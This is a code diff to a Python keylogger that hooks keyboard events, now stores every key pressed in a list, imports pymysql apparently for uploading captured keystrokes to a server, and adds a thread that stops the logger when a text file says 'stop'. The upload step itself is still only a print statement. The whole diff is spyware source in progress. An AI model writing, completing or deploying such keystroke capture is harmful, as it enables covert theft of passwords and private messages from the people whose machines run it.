@@ -3,7 +3,8 @@ import sys
 from win32api import LoadKeyboardLayout
 import keyboard
 import time
-
+import pendulum
+import pymysql
 
 class App():
     def __init__(self):
@@ -12,22 +13,18 @@ class App():
 
         self.th1 = Thread(target=self.start_keylogger)
         self.th2 = Thread(target=self.send_data)
+        self.th3 = Thread(target=self.check_params)
 
-
-    def send_data(self):
-        if self.kill_send_info == True:
-            print('Sending data was stopped')
-            sys.exit()
-        else:
-            print('sending data first')
-            time.sleep(3)
-            self.send_data()
-
+        self.data = []
 
 
     def get_keyboard_pressed(self, e):
         if e.event_type == 'up':
+            self.data.append(e.name)
             print(f'You pressed: {e.name}')
+            print(f'\n\nYou list is: {self.data}')
+
+
 
 
     def start_keylogger(self):
@@ -39,37 +36,50 @@ class App():
             sys.exit()
 
 
+    def send_data(self):
+        if self.kill_send_info == False:
+            print(f'Saving data to server!')
+
+
+
+
+            time.sleep(3)
+            self.send_data()
+        else:
+            print('Sending data was STOPPED!')
+            sys.exit()
+
+
     def check_params(self):
-        with open('test.txt', 'r') as file:
-            result = file.read()
-            if result == 'stop':
-                self.kill_keyboard = True
-                self.kill_send_info = True
-                sys.exit()
-            else:
-                print('Flags are working.')
-                time.sleep(1.5)
-                self.check_params()
+        try:
+            with open('test.txt', 'r') as file:
+                if file.read().lower() == 'stop':
+                    self.kill_keyboard = True
+                    self.kill_send_info = True
+                    sys.exit()
+                else:
+                    date = pendulum.now()
+                    print(f'Flags are working [{date.hour}:{date.minute}:{date.second}]')
+                    time.sleep(5)
+                    self.check_params()
+        except Exception as err:
+            print(f'Error: \n{err}. \nWe will create file now.')
+            with open('test.txt', 'w') as file:
+                file.write('Working')
+            self.check_params()
+
 
 
 
     def run(self):
-        self.th1.start()
-        self.th2.start()
-        self.check_params()
+        self.th1.start()  # start first Thread - start_keylogger
+        self.th2.start()  # start second Thread - send_data
+        self.th3.start()  # start third Thread - check_params
+
+
+
 
 
 if __name__ == '__main__':
     LoadKeyboardLayout('00000409', 1)
     App().run()
-
-
-
-# with open("test.txt", "r") as f:
-        #     text = f.read()
-        #     if text == '1':
-        #         print(f'like: {text}')
-        #         time.sleep(1)
-        #         self.smel()
-        #     else:
-        #         sys.exit()
